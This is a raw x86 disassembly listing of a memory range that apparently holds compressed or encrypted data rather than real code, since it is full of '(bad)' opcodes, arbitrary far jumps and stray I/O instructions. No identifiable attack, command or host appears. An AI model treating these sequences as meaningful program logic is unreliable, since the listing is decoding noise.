  41a7b1:	adc    al,0xbc
  41a7b3:	imul   eax,edi,0xffffffb2
  41a7b6:	xor    al,BYTE PTR [edx]
  41a7b8:	ret    0x2e49
  41a7bb:	mov    ebx,0xb9fe899e
  41a7c0:	retf   
  41a7c1:	adc    bh,BYTE PTR [ebx]
  41a7c3:	sub    al,0x9d
  41a7c5:	mov    WORD PTR [edi+ebp*1-0x3b],ds
  41a7c9:	pop    ecx
  41a7ca:	inc    esi
  41a7cb:	push   esi
  41a7cc:	xchg   ecx,eax
  41a7cd:	ss cli 
  41a7cf:	repz and eax,0x8fe7293
  41a7d5:	popf   
  41a7d6:	mov    ebp,0x3a178301
  41a7db:	push   eax
  41a7dc:	(bad)  
  41a7dd:	rcr    DWORD PTR [eax-0x6ac0ff36],cl
  41a7e3:	test   al,0xfa
  41a7e5:	js     0x41a773
  41a7e7:	xchg   edi,eax
  41a7e8:	dec    esp
  41a7e9:	jl     0x41a82f
  41a7eb:	sub    BYTE PTR [ebx],dh
	...
  41a855:	add    bl,dh
  41a857:	xchg   edi,eax
  41a858:	jae    0x41a7e1
  41a85a:	ja     0x41a843
  41a85c:	div    edi
  41a85e:	mov    ds:0x545327ca,al
  41a863:	mov    ebx,0x1d212f53
  41a868:	add    DWORD PTR [eax],eax
  41a86a:	inc    DWORD PTR [eax]
  41a86c:	add    BYTE PTR [eax],al
  41a86e:	cmc    
  41a86f:	and    bl,BYTE PTR [esi-0x45c63b2a]
  41a875:	jecxz  0x41a839
  41a877:	jl     0x41a875
  41a879:	mov    bh,0x9e
  41a87b:	(bad)  
  41a87c:	std    
  41a87d:	(bad)  
  41a87e:	out    dx,eax
  41a87f:	or     bh,BYTE PTR [edx+0x5c]
  41a882:	es xchg ecx,eax
  41a884:	fxch   st(5)
  41a886:	stos   DWORD PTR es:[edi],eax
  41a887:	in     al,dx
  41a888:	mul    DWORD PTR [eax+0x42]
  41a88b:	inc    edx
  41a88c:	call   0xcde7:0xc228240e
  41a893:	jecxz  0x41a88d
  41a895:	test   al,0x45
  41a897:	sbb    eax,0xfb2c4719
  41a89c:	add    esi,DWORD PTR [ecx]
  41a89e:	fbld   TBYTE PTR [eax+0xe]
  41a8a1:	dec    edi
  41a8a2:	inc    esp
  41a8a3:	mul    bh
  41a8a5:	stos   DWORD PTR es:[edi],eax
  41a8a6:	jmp    0x539d9d68
  41a8ab:	inc    ebx
  41a8ac:	sbb    esp,DWORD PTR [ebp+esi*4+0x75]
  41a8b0:	popa   
  41a8b1:	stos   BYTE PTR es:[edi],al
  41a8b2:	rol    edi,1
  41a8b4:	push   cs
  41a8b5:	outs   dx,DWORD PTR ds:[esi]
  41a8b6:	pop    ebx
  41a8b7:	idiv   DWORD PTR [edx+edx*4]
  41a8ba:	gs das 
  41a8bc:	mov    ebp,0x5f4866c
  41a8c1:	imul   esi,DWORD PTR [edx+0x7e],0xd8584afa
  41a8c8:	push   cs
  41a8c9:	adc    eax,0x18fd27cc
  41a8ce:	mov    bh,0xdc
  41a8d0:	jge    0x41a8f9
  41a8d2:	sub    dh,BYTE PTR [edx+0x23da4749]
  41a8d8:	xor    edx,DWORD PTR [edx+0x6b]
  41a8db:	sub    DWORD PTR [edx-0x4305097],esi
  41a8e1:	out    dx,eax
  41a8e2:	cmp    al,0x41
  41a8e4:	push   eax
  41a8e5:	xchg   esp,eax
  41a8e6:	dec    esi
  41a8e7:	add    DWORD PTR [edx-0xd41ebbc],0x27530ece
  41a8f1:	sub    ecx,DWORD PTR ds:0xdcdbdfdd
  41a8f7:	fs push eax
  41a8f9:	ja     0x41a8b2
  41a8fb:	clc    
  41a8fc:	push   eax
  41a8fd:	fcomp  QWORD PTR [edi-0x30]
  41a900:	mov    cl,0xa9
  41a902:	jno    0x41a8c3
  41a904:	or     BYTE PTR [eax+0x470b4fc5],dl
  41a90a:	cmp    dh,0xbe
  41a90d:	ja     0x41a929
  41a90f:	hlt    
  41a910:	and    BYTE PTR [ebp+ebx*4+0x13dd9b12],ah
  41a917:	fcom   DWORD PTR [ebp-0x477aef74]
  41a91d:	addr16 mov edi,0x232d2eaa
  41a923:	sub    ebx,DWORD PTR [edx+0x7eff75ef]
  41a929:	push   edx
  41a92a:	mov    dh,0x1b
  41a92c:	cmp    ebp,ebx
  41a92e:	mov    dl,0x3b
  41a930:	rcr    BYTE PTR [edi],0x30
  41a933:	jno    0x41a8ea
  41a935:	mov    ds:0x19b75563,eax
  41a93a:	fcomi  st,st(4)
  41a93c:	aaa    
  41a93d:	pop    ecx
  41a93e:	sbb    ebp,DWORD PTR [eax+eax*1+0x563957ff]
  41a945:	jge    0x41a971
  41a947:	in     eax,dx
  41a948:	dec    ebp
  41a949:	cwde   
  41a94a:	shr    BYTE PTR [esp+esi*8],1
  41a94d:	ja     0x41a9cb
  41a94f:	jnp    0x41a984
  41a951:	mov    al,0x77
  41a953:	and    edx,DWORD PTR ds:0xc75ee4ce
  41a959:	aaa    
  41a95a:	loopne 0x41a9b5
  41a95c:	mov    ?,WORD PTR [ebp+0x3]
  41a95f:	std    
  41a960:	mov    cl,0xe9
  41a962:	lock or DWORD PTR [esi+0x2f621aed],0xffffffd0
  41a96a:	mov    bl,0x71
  41a96c:	mov    edi,0x0
	...
  41a9d5:	add    BYTE PTR ds:0xcf4a867e,dh
  41a9db:	cli    
  41a9dc:	std    
  41a9dd:	jg     0x41aa2d
  41a9df:	push   edx
  41a9e0:	pushf  
  41a9e1:	dec    esp
  41a9e2:	add    esi,DWORD PTR ds:0x1e209268
  41a9e8:	add    DWORD PTR [eax],eax
  41a9ea:	inc    DWORD PTR [eax]
  41a9ec:	add    BYTE PTR [eax],al
  41a9ee:	jb     0x41a9b0
  41a9f0:	push   0x28eeca68
  41a9f5:	imul   esp,ebp,0xffffffda
  41a9f8:	outs   dx,BYTE PTR ds:[esi]
  41a9f9:	mov    dh,0x94
  41a9fb:	mov    edi,0x6465f825
  41aa00:	in     eax,dx
  41aa01:	dec    esi
  41aa02:	jl     0x41a9ad
  41aa04:	xor    ch,BYTE PTR [ebx+0x10cff6]
  41aa0a:	(bad)  
  41aa0b:	push   0xc3fc2575
  41aa10:	and    eax,esp
  41aa12:	mov    dh,0x30
  41aa14:	xor    al,0x10
  41aa16:	xchg   edx,eax
  41aa17:	std    
  41aa18:	ficomp WORD PTR [edi]
  41aa1a:	scas   eax,DWORD PTR es:[edi]
  41aa1b:	cmp    eax,0x36ee055a
  41aa20:	push   edx
  41aa21:	lock cmp bh,BYTE PTR [edx]
  41aa24:	push   esp
  41aa25:	fistp  WORD PTR [esi+0x5]
  41aa28:	out    0xda,eax
  41aa2a:	daa    
  41aa2b:	dec    ebp
  41aa2c:	and    BYTE PTR [eax+0x4b],bl
  41aa2f:	sub    eax,0x8720eb91
  41aa34:	aas    
  41aa35:	xchg   eax,ecx
  41aa37:	(bad)  [edi+0x2ee5b8bb]
  41aa3d:	fiadd  DWORD PTR [edi-0x6a35b4b7]
  41aa43:	dec    ebp
  41aa44:	xchg   esp,eax
  41aa45:	in     al,dx
  41aa46:	jns    0x41a9cf
  41aa48:	or     BYTE PTR [ebp+0x39bd54f],bh
  41aa4e:	sbb    bl,BYTE PTR [esi+ebp*8+0x682466e2]
  41aa55:	xor    al,0x5
  41aa57:	push   esp
  41aa58:	mov    BYTE PTR [ecx+0x5335456e],al
  41aa5e:	es pop es
  41aa60:	mov    eax,ds:0x3a07e72b
  41aa65:	sbb    cl,BYTE PTR [ebx+0x5efdea26]
  41aa6b:	add    al,0x1d
  41aa6d:	fisub  DWORD PTR [ebp+0x6b8ab2de]
  41aa73:	inc    ebp
  41aa74:	sbb    ecx,DWORD PTR [ecx]
  41aa76:	xor    dh,ah
  41aa78:	pop    eax
  41aa79:	mov    bl,0xe3
  41aa7b:	jns    0x41aa0b
  41aa7d:	ss icebp 
  41aa7f:	mov    WORD PTR [ebp+0x2a],cs
  41aa82:	xchg   DWORD PTR [esi-0x31],eax
  41aa85:	stos   BYTE PTR es:[edi],al
  41aa86:	ins    BYTE PTR es:[edi],dx
  41aa87:	push   edx
  41aa88:	mov    al,BYTE PTR [esi+eiz*2-0x68a69c2b]
  41aa8f:	fidiv  DWORD PTR [ecx+0x46]
  41aa92:	mov    eax,ds:0x73ac40f5
  41aa97:	js     0x41aabb
  41aa99:	mov    ecx,0x9c71173f
  41aa9e:	inc    edi
  41aa9f:	fs jne 0x41aaee
  41aaa2:	xor    eax,0x91bdb013
  41aaa7:	in     al,0xef
  41aaa9:	xchg   ecx,eax
  41aaaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aaab:	call   0x5a3fa392
  41aab0:	jmp    0x9ca5d1d1
  41aab5:	ror    cl,0xd7
  41aab8:	into   
  41aab9:	add    ebp,DWORD PTR ds:0x291a3e6d
  41aabf:	sbb    al,0xde
  41aac1:	mov    WORD PTR [edi+ebx*4+0x73],?
  41aac5:	in     eax,0x5b
  41aac7:	sbb    ch,BYTE PTR [ecx+0x342832cb]
  41aacd:	sbb    BYTE PTR [eax],ah
  41aacf:	mov    DWORD PTR [edx+0x1952100e],ebx
  41aad5:	lea    edx,[esi+0x1e43c8d1]
  41aadb:	push   0x479e4577
  41aae0:	lods   al,BYTE PTR ds:[esi]
  41aae1:	test   al,0xee
  41aae3:	pop    edx
  41aae4:	mov    bl,0x6c
  41aae6:	sbb    DWORD PTR [edi],edi
  41aae8:	inc    ebp
  41aae9:	mov    bl,0xc3
  41aaeb:	ja     0x41ab22
	...
  41ab55:	add    bh,dh
  41ab57:	add    esp,ebx
  41ab59:	mov    ah,0xfe
  41ab5b:	std    
  41ab5c:	inc    DWORD PTR [ebx+0x5f]
  41ab5f:	sbb    BYTE PTR [esi+0x43],ah
  41ab62:	jmp    0x11f:0x1f21f090
  41ab69:	add    bh,bh
  41ab6b:	add    BYTE PTR [eax],al
  41ab6d:	add    BYTE PTR [eax+0xc],ch
  41ab70:	(bad)  
  41ab71:	and    bh,cl
  41ab73:	daa    
  41ab74:	fstp   DWORD PTR [esi+0x1fc0c315]
  41ab7a:	inc    esp
  41ab7b:	or     al,0x37
  41ab7d:	jmp    0x12e3f47e
  41ab82:	aas    
  41ab83:	pop    edi
  41ab84:	fs pop esp
  41ab86:	icebp  
  41ab87:	jns    0x41ab1c
  41ab89:	xchg   ecx,eax
  41ab8a:	fild   WORD PTR [ecx+eax*2+0x4b]
  41ab8e:	iret   
  41ab8f:	clc    
  41ab90:	pusha  
  41ab91:	fwait
  41ab92:	jnp    0x41ab27
  41ab94:	xchg   edx,eax
  41ab95:	sbb    BYTE PTR [edx],0x1b
  41ab98:	xor    BYTE PTR [edx-0x2],dl
  41ab9b:	outs   dx,BYTE PTR ds:[esi]
  41ab9c:	loopne 0x41ab7b
  41ab9e:	add    ecx,DWORD PTR ds:0x6f2bca05
  41aba4:	fstp   TBYTE PTR [edi]
  41aba6:	bound  ebp,QWORD PTR [edx+eiz*2+0x37]
  41abaa:	cmc    
  41abab:	mov    eax,0x1713f201
  41abb0:	fidivr DWORD PTR [ebx]
  41abb2:	mov    ecx,0x29e18ca9
  41abb7:	and    esp,edi
  41abb9:	clc    
  41abba:	imul   BYTE PTR ds:0xc36e442c
  41abc0:	mov    ebx,DWORD PTR [esi+0x74]
  41abc3:	lods   al,BYTE PTR ds:[esi]
  41abc4:	inc    edi
  41abc5:	push   ecx
  41abc6:	and    al,0x80
  41abc8:	addr16 xchg eax,ebx
  41abcb:	xchg   ebp,eax
  41abcc:	test   al,0x83
  41abce:	iret   
  41abcf:	not    DWORD PTR [ebx]
  41abd1:	repnz xchg edi,eax
  41abd3:	add    ah,bl
  41abd5:	dec    BYTE PTR [eax]
  41abd7:	cmp    al,0x8a
  41abd9:	sahf   
  41abda:	mov    esp,DWORD PTR [edx-0x46a9b940]
  41abe0:	xor    eax,0xa4e838ad
  41abe5:	mov    al,0x6b
  41abe7:	add    DWORD PTR [eax],ecx
  41abe9:	jg     0x41ac66
  41abeb:	inc    esp
  41abec:	shr    al,1
  41abee:	dec    esp
  41abef:	inc    esp
  41abf0:	sbb    ah,BYTE PTR [esi]
  41abf2:	(bad)  
  41abf3:	repnz or al,0x63
  41abf6:	adc    al,0x8a
  41abf8:	sbb    DWORD PTR [ebx+eax*8-0x7f79b8c8],esp
  41abff:	pop    es
  41ac00:	adc    DWORD PTR [ecx],ebp
  41ac02:	out    0x4f,al
  41ac04:	sbb    DWORD PTR [edi-0x79],edx
  41ac07:	adc    BYTE PTR ds:0x995d0a6c,0x95
  41ac0e:	and    BYTE PTR [eax],cl
  41ac10:	mov    eax,ds:0x18afcab4
  41ac15:	cmp    DWORD PTR [ebx+0x35],ebp
  41ac18:	pop    esp
  41ac19:	mov    al,ds:0x7d21245f
  41ac1e:	dec    edi
  41ac1f:	(bad)  
  41ac20:	sbb    ah,dh
  41ac22:	push   eax
  41ac23:	lock pop ebp
  41ac25:	inc    eax
  41ac26:	adc    BYTE PTR [ebx+0x10],cl
  41ac29:	xchg   esp,eax
  41ac2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac2b:	dec    ebp
  41ac2c:	mov    cl,0xa5
  41ac2e:	dec    ebp
  41ac2f:	ins    DWORD PTR es:[edi],dx
  41ac30:	xor    al,0x58
  41ac32:	push   cs
  41ac33:	sahf   
  41ac34:	jns    0x41ac76
  41ac36:	ins    DWORD PTR es:[edi],dx
  41ac37:	adc    dh,BYTE PTR [edi-0xb]
  41ac3a:	stc    
  41ac3b:	scas   al,BYTE PTR es:[edi]
  41ac3c:	repnz adc ebp,eax
  41ac3f:	xchg   edi,eax
  41ac40:	ja     0x41ac9e
  41ac42:	mov    ?,WORD PTR [ebx+0x57a395da]
  41ac48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac49:	fld    QWORD PTR ds:0x8facdec6
  41ac4f:	add    eax,0x3167c2d7
  41ac54:	icebp  
  41ac55:	cwde   
  41ac56:	ins    DWORD PTR es:[edi],dx
  41ac57:	aam    0xfc
  41ac59:	retf   0x4c2d
  41ac5c:	pop    es
  41ac5d:	jns    0x41abfe
  41ac5f:	hlt    
  41ac60:	or     ch,al
  41ac62:	mov    edi,0x27744cfd
  41ac67:	rcr    BYTE PTR [eax+0x1582285f],cl
	...
  41acd5:	add    BYTE PTR [edx+0x49],ch
  41acd8:	es cmp al,0x27
  41acdb:	jg     0x41ad57
  41acdd:	pop    edi
  41acde:	or     al,0x44
  41ace0:	xor    ah,BYTE PTR [esp+eiz*4-0x3a]
  41ace4:	adc    esp,0x1e
  41ace7:	and    BYTE PTR [ecx],al
  41ace9:	add    bh,bh
  41aceb:	add    BYTE PTR [eax],al
  41aced:	add    BYTE PTR [eax],al
  41acef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acf0:	sub    ebx,DWORD PTR [edx+0xd]
  41acf3:	sub    ebp,DWORD PTR [ebx-0x1b]
  41acf6:	push   0xfffffff7
  41acf8:	(bad)  
  41acf9:	xor    ebx,DWORD PTR [eax+0x12cc6e8a]
  41acff:	jecxz  0x41acee
  41ad01:	lea    ecx,[ebp-0x42]
  41ad04:	adc    ch,ch
  41ad06:	les    ecx,FWORD PTR [ebx]
  41ad08:	bound  ecx,QWORD PTR [edi+0x0]
  41ad0b:	mov    dl,0x50
  41ad0d:	fcomp  QWORD PTR [edi-0x6bb73cc7]
  41ad13:	div    esi
  41ad15:	test   al,0x4d
  41ad17:	mov    al,0xdc
  41ad19:	popa   
  41ad1a:	xchg   ecx,eax
  41ad1b:	adc    DWORD PTR [bx+0x127e],esp
  41ad20:	and    DWORD PTR [eax+0x41],esi
  41ad23:	loope  0x41acc7
  41ad25:	dec    edi
  41ad26:	jbe    0x41ad12
  41ad28:	(bad)
  41ad2c:	call   0x13ec:0x61fedd3
  41ad33:	clc    
  41ad34:	or     ebp,DWORD PTR [ecx]
  41ad36:	ret    0x73c5
  41ad39:	mov    ecx,0x92e2b4e5
  41ad3e:	adc    ecx,DWORD PTR [eax+0x5784d061]
  41ad44:	es inc esp
  41ad46:	daa    
  41ad47:	ins    DWORD PTR es:[edi],dx
  41ad48:	push   ds
  41ad49:	and    BYTE PTR [ebx-0x5134067f],bh
  41ad4f:	mov    ds:0x2d0683a2,eax
  41ad54:	sub    ebp,esi
  41ad56:	repz xor BYTE PTR [ebp-0x30d5e753],ah
  41ad5d:	push   0x67c09cf0
  41ad62:	jae    0x41adc9
  41ad64:	aam    0xe2
  41ad66:	pop    es
  41ad67:	rol    ebp,cl
  41ad69:	xor    DWORD PTR [ebx],ecx
  41ad6b:	in     al,dx
  41ad6c:	mov    ds:0x77670290,al
  41ad71:	pushf  
  41ad72:	outs   dx,DWORD PTR ds:[esi]
  41ad73:	sub    al,0xbf
  41ad75:	dec    eax
  41ad76:	fiadd  WORD PTR [ebx-0x7a77d20b]
  41ad7c:	(bad)  
  41ad7d:	pop    ds
  41ad7e:	push   es
  41ad7f:	jo     0x41adfe
  41ad81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad83:	mov    cl,0x20
  41ad85:	add    eax,0xe2bd6379
  41ad8a:	and    ah,0x5f
  41ad8d:	(bad)  
  41ad8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad8f:	mov    dl,0x43
  41ad91:	and    edx,DWORD PTR [eax]
  41ad93:	popf   
  41ad94:	aaa    
  41ad95:	popf   
  41ad96:	clc    
  41ad97:	sbb    BYTE PTR [edi+0x2d14c805],dl
  41ad9d:	adc    al,0xbb
  41ad9f:	push   0x13
  41ada1:	lods   al,BYTE PTR ds:[esi]
  41ada2:	leave  
  41ada3:	mov    cs,WORD PTR [eax+0x1f]
  41ada6:	push   ebp
  41ada7:	sti    
  41ada8:	sti    
  41ada9:	ins    DWORD PTR es:[edi],dx
  41adaa:	adc    eax,0x3ccf4c6d
  41adaf:	inc    ebp
  41adb0:	lods   eax,DWORD PTR ds:[esi]
  41adb1:	ins    DWORD PTR es:[edi],dx
  41adb2:	push   0xffffffb0
  41adb4:	mov    DWORD PTR [ebx+eiz*4-0x5b],0x5ae3c48c
  41adbc:	sbb    bl,BYTE PTR [ebx+0x47]
  41adbf:	add    ebp,DWORD PTR [edi+0x18]
  41adc2:	mov    cl,0x64
  41adc4:	mov    dh,0xa1
  41adc6:	lods   eax,DWORD PTR ds:[esi]
  41adc7:	xchg   edx,eax
  41adc8:	adc    al,0xcc
  41adca:	mov    ebx,0x29ccffb6
  41adcf:	push   eax
  41add0:	inc    edi
  41add1:	pop    ebx
  41add2:	test   BYTE PTR [ecx+0x22],cl
  41add5:	les    ebx,FWORD PTR [ebx-0x218ab2da]
  41addb:	adc    bl,al
  41addd:	dec    eax
  41adde:	push   ebx
  41addf:	(bad)  
  41ade0:	xchg   ebx,eax
  41ade1:	pop    ebx
  41ade2:	(bad)  
  41ade3:	sbb    BYTE PTR [bp+si-0x30],dh
  41ade7:	and    eax,0x89ab270
  41adec:	mov    eax,DWORD PTR [eax]
	...
  41ae56:	push   ebp
  41ae57:	clc    
  41ae58:	or     DWORD PTR [esi-0x4280053],ebx
  41ae5e:	dec    edi
  41ae5f:	push   eax
  41ae60:	cmp    DWORD PTR [ebp+esi*1+0x1d94e1ec],esp
  41ae67:	and    DWORD PTR [ecx],eax
  41ae69:	add    bh,bh
  41ae6b:	add    BYTE PTR [eax],al
  41ae6d:	add    dl,dl
  41ae6f:	shl    BYTE PTR [ecx+0x24],1
  41ae72:	(bad)  
  41ae73:	ror    DWORD PTR [eax],cl
  41ae75:	pop    eax
  41ae76:	add    al,0xbb
  41ae78:	lock adc ebp,esp
  41ae7b:	lods   al,BYTE PTR ds:[esi]
  41ae7c:	xlat   BYTE PTR ds:[ebx]
  41ae7d:	jg     0x41ae5a
  41ae7f:	adc    al,0x25
  41ae81:	test   al,0x6b
  41ae83:	retf   0xde9a
  41ae86:	cmp    esi,ebp
  41ae88:	pop    ss
  41ae89:	rcl    BYTE PTR [ebp-0x2f634dec],cl
  41ae8f:	and    bh,BYTE PTR [eax+eiz*8+0x759e7be7]
  41ae96:	mov    edi,0xf5ebeb4
  41ae9b:	rcl    DWORD PTR [edi-0x2e],0xd5
  41ae9f:	stos   BYTE PTR es:[edi],al
  41aea0:	fs (bad) 
  41aea2:	in     al,0x97
  41aea4:	mov    al,0xe6
  41aea6:	cmp    ch,0x37
  41aea9:	or     edx,ebp
  41aeab:	or     edi,DWORD PTR [ebx+0x5b]
  41aeae:	cwde   
  41aeaf:	cwde   
  41aeb0:	int3   
  41aeb1:	js     0x41aeb1
  41aeb3:	lock stc 
  41aeb5:	and    cl,BYTE PTR [eax+edi*2]
  41aeb8:	stc    
  41aeb9:	jnp    0x41ae4f
  41aebb:	pop    eax
  41aebc:	out    dx,al
  41aebd:	es dec edi
  41aebf:	jg     0x41af14
  41aec1:	sub    eax,edx
  41aec3:	test   DWORD PTR [edx-0xc847d1c],0xdd48314
  41aecd:	adc    dh,BYTE PTR [eax]
  41aecf:	dec    esp
  41aed0:	jno    0x41ae69
  41aed2:	lods   eax,DWORD PTR ds:[esi]
  41aed3:	out    0xf1,eax
  41aed5:	scas   al,BYTE PTR es:[edi]
  41aed6:	lods   eax,DWORD PTR ds:[esi]
  41aed7:	jae    0x41af24
  41aed9:	mov    eax,ds:0xdf5344e4
  41aede:	dec    ebp
  41aedf:	or     DWORD PTR [esi+0x4b30063e],eax
  41aee5:	clc    
  41aee6:	(bad)  
  41aee7:	sar    al,cl
  41aee9:	and    eax,0xf5be8f50
  41aeee:	lods   eax,DWORD PTR ds:[esi]
  41aeef:	mov    bh,BYTE PTR [eax+0x3f284287]
  41aef5:	gs jae 0x41aefa
  41aef8:	gs xchg edx,eax
  41aefa:	mov    esp,?
  41aefc:	jmp    0xc662:0x696f6b48
  41af03:	push   edx
  41af04:	jg     0x41af61
  41af06:	dec    ebp
  41af07:	mov    esi,0xe3d93bb
  41af0c:	and    BYTE PTR [edx+ebp*1+0x27e5f6e4],bh
  41af13:	loopne 0x41af40
  41af15:	mov    WORD PTR [ebp-0x3e],fs
  41af18:	sbb    ch,ch
  41af1a:	xchg   edi,eax
  41af1b:	data16 or BYTE PTR [edi+edi*8],dh
  41af1f:	jmp    0x41af6a
  41af21:	pop    esi
  41af22:	inc    edx
  41af23:	lea    ebx,[eax+0x8ac3516]
  41af29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af2a:	aad    0x24
  41af2c:	mov    dh,0x85
  41af2e:	and    edi,edi
  41af30:	mov    dl,0x36
  41af32:	cmp    DWORD PTR [ecx],edx
  41af34:	and    DWORD PTR [edi],0xffffffe5
  41af37:	dec    edi
  41af38:	xchg   edi,eax
  41af39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af3a:	mov    bh,0xc7
  41af3c:	add    eax,0x9be41867
  41af41:	or     ah,dl
  41af43:	in     al,dx
  41af44:	add    DWORD PTR [ebx-0x67],ecx
  41af47:	rcl    DWORD PTR cs:[ecx+0x2],cl
  41af4b:	cmp    ah,ah
  41af4d:	pop    ds
  41af4e:	mov    bl,0x76
  41af50:	mov    ds:0x40b02166,al
  41af55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af56:	or     al,0xd0
  41af58:	int    0x34
  41af5a:	stos   DWORD PTR es:[edi],eax
  41af5b:	inc    esi
  41af5c:	out    dx,al
  41af5d:	fadd   DWORD PTR [edi+edx*2+0x5f]
  41af61:	mov    edi,0x1b7a69ac
  41af66:	push   esi
  41af67:	add    DWORD PTR [edx],ecx
  41af69:	xchg   ebx,eax
  41af6a:	bnd jmp 0x41af4b
	...
  41afd5:	add    ch,al
  41afd7:	stc    
  41afd8:	lods   eax,DWORD PTR ds:[esi]
  41afd9:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41afdf:	mov    ecx,0xc6df44ee
  41afe4:	jge    0x41afe6
  41afe6:	sbb    al,0x22
  41afe8:	add    DWORD PTR [eax],eax
  41afea:	inc    DWORD PTR [eax]
  41afec:	add    BYTE PTR [eax],al
  41afee:	lahf   
  41afef:	jl     0x41af86
  41aff1:	or     DWORD PTR [eax-0x48ff8226],edx
  41aff7:	sub    esi,DWORD PTR [esi-0x9]
  41affa:	inc    ecx
  41affb:	mov    dh,0xd3
  41affd:	pop    ebp
  41affe:	ds inc ebp
  41b000:	stc    
  41b001:	jb     0x41b038
  41b003:	hlt    
  41b004:	jmp    0xc0e0:0x429ce261
  41b00b:	pusha  
  41b00c:	sub    ebx,DWORD PTR [edi]
  41b00e:	push   0x3a
  41b010:	imul   edi,esp,0xc3b0a92f
  41b016:	and    ebx,DWORD PTR [ebx]
  41b018:	cmp    DWORD PTR [eax+0x39],0x3c51aa85
  41b01f:	xor    eax,0x46dc7fe6
  41b024:	inc    ecx
  41b025:	sbb    edx,DWORD PTR [edi]
  41b027:	fxch   st(7)
  41b029:	imul   esi,DWORD PTR [edi],0xf799e4e2
  41b02f:	mov    BYTE PTR [ebx],bh
  41b031:	hlt    
  41b032:	cli    
  41b033:	cwde   
  41b034:	inc    ecx
  41b035:	add    esi,ecx
  41b037:	xchg   ah,bl
  41b039:	jae    0x41b0a8
  41b03b:	dec    esp
  41b03c:	xchg   edx,eax
  41b03d:	stc    
  41b03e:	shl    esp,0x31
  41b041:	rcl    BYTE PTR ds:0x8cb7580,0xa9
  41b048:	(bad)  
  41b049:	ja     0x41b024
  41b04b:	mov    bl,0xaf
  41b04d:	shl    BYTE PTR [ecx-0x3f],0xd0
  41b051:	dec    ebp
  41b052:	adc    al,BYTE PTR ds:0xe2d26bc2
  41b058:	xchg   ebx,eax
  41b059:	jmp    0xd0dc8930
  41b05e:	pop    esp
  41b05f:	stos   DWORD PTR es:[edi],eax
  41b060:	sbb    DWORD PTR [ebx+edi*8-0x1b76877],0xfffffff7
  41b068:	es inc edx
  41b06a:	or     eax,DWORD PTR [ebp+0x7b]
  41b06d:	adc    al,BYTE PTR [ecx+0x59]
  41b070:	lds    esi,FWORD PTR [ebp+0x6d4b7f34]
  41b076:	add    al,0x9c
  41b078:	nop
  41b079:	repz bound ecx,QWORD PTR [ebp-0x41]
  41b07d:	adc    edi,DWORD PTR [esi]
  41b07f:	lahf   
  41b080:	retw   0xfbe8
  41b084:	ss mov bh,0xd6
  41b087:	shr    dl,cl
  41b089:	test   eax,0x118041cd
  41b08e:	lds    ecx,FWORD PTR [edi+0x72218f48]
  41b094:	pop    edi
  41b095:	sub    BYTE PTR [edx+edx*4],cl
  41b098:	cs jns 0x41b10f
  41b09b:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b09d:	jns    0x41b0f2
  41b09f:	or     al,0x4b
  41b0a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0a2:	and    esi,DWORD PTR [edi+0x3985f55d]
  41b0a8:	sbb    DWORD PTR [eax-0x22],ebx
  41b0ab:	xlat   BYTE PTR ds:[ebx]
  41b0ac:	sub    esi,ecx
  41b0ae:	xchg   esp,eax
  41b0af:	ret    
  41b0b0:	shr    dl,1
  41b0b2:	push   edi
  41b0b3:	in     eax,dx
  41b0b4:	jle    0x41b083
  41b0b6:	je     0x41b041
  41b0b8:	icebp  
  41b0b9:	jecxz  0x41b04e
  41b0bb:	imul   esi,eax,0xffffff9b
  41b0be:	cmp    dl,ch
  41b0c0:	test   eax,0x17ca98fe
  41b0c5:	mov    al,0x79
  41b0c7:	loopne 0x41b118
  41b0c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0ca:	pop    ds
  41b0cb:	mov    ds:0x8737c4b9,eax
  41b0d0:	mov    cl,0x46
  41b0d2:	inc    eax
  41b0d3:	cmp    al,0x73
  41b0d5:	xchg   ebp,eax
  41b0d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0d7:	mov    dl,0x1
  41b0d9:	cmp    al,0xf0
  41b0db:	or     al,0xd
  41b0dd:	sbb    DWORD PTR [edx],ebp
  41b0df:	jo     0x41b06d
  41b0e1:	mov    ds:0x66d68eff,al
  41b0e6:	ja     0x41b130
  41b0e8:	frstor [ebx+0x30]
  41b0eb:	and    ah,BYTE PTR [esi]
	...
  41b155:	add    dh,al
  41b157:	ficom  WORD PTR [eax]
  41b159:	stos   DWORD PTR es:[edi],eax
  41b15a:	sbb    bh,ch
  41b15c:	(bad)  
  41b15d:	call   DWORD PTR [edx+edx*8+0x75]
  41b161:	mov    edi,0x9788a84b
  41b166:	sbb    esp,DWORD PTR [ebx]
  41b168:	add    DWORD PTR [eax],eax
  41b16a:	inc    DWORD PTR [eax]
  41b16c:	add    BYTE PTR [eax],al
  41b16e:	ds xchg al,dh
  41b171:	rcr    DWORD PTR [ecx+0xc],cl
  41b174:	ja     0x41b116
  41b176:	ret    0x96f
  41b179:	lock fld TBYTE PTR [esi+eax*8+0x4d]
  41b17e:	(bad)  
  41b17f:	in     eax,0x33
  41b181:	xchg   ebx,eax
  41b182:	sar    BYTE PTR [edx-0x71fa978e],cl
  41b188:	outs   dx,BYTE PTR ds:[esi]
  41b189:	ins    BYTE PTR es:[di],dx
  41b18b:	ret    0xacad
  41b18e:	jmp    0x41b1c6
  41b190:	pushf  
  41b191:	push   esi
  41b192:	push   edx
  41b193:	or     ecx,DWORD PTR [ebx+0x4fa5cb1a]
  41b199:	outs   dx,BYTE PTR ds:[esi]
  41b19a:	ret    0x63ca
  41b19d:	shl    DWORD PTR [ecx+0x0],0x72
  41b1a1:	mov    ch,al
  41b1a3:	pusha  
  41b1a4:	fbstp  TBYTE PTR [edi+0x1f1e20e]
  41b1aa:	into   
  41b1ab:	mov    al,0x2f
